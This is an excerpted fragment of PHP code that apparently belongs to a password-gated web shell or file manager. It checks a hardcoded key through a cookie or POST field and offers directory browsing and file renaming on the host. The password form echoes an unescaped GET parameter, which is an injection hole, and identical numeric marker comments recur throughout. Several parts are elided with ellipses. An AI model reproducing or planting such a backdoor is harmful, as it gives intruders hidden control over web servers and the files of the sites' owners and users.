...
$auth_key = "2bc0dd1ffc3a7a9db1e6f21ee163af76";
...
$pass = false;
if (isset($_COOKIE['pw_name_40999'])) {
    if(($_COOKIE['pw_name_40999']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_40999'])) {
        if(($_POST['pw_name_40999']) == $auth_key) {
            setcookie("pw_name_40999", $_POST['pw_name_40999']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_40999' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724034250931739 1724034250770389 1724034250991463 1724034250845960
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724034250931739 1724034250770389 1724034250991463 1724034250845960
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724034250931739 1724034250770389 1724034250991463 1724034250845960
            $name = PATH . "/" . $_GET['r'];
